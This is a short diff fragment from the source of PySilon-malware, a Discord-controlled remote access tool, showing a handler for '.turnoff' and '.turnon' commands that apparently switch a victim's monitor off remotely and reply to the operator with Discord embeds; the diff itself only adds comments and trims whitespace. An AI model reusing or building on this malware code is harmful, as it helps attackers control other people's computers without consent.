@@ -1,5 +1,7 @@
 import ctypes
+# end of imports
 
+# on message
 elif message.content == '.turnoff':
     if not turned_off:
         await message.delete()
@@ -37,5 +39,5 @@ elif message.content == '.turnon':
     else: 
         embed = discord.Embed(title="🔴 Hold on!",description=f'```The monitor is not turned off. Turn it off by using .turnoff```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-        await message.channel.send(embed=embed)   
+        await message.channel.send(embed=embed)
         
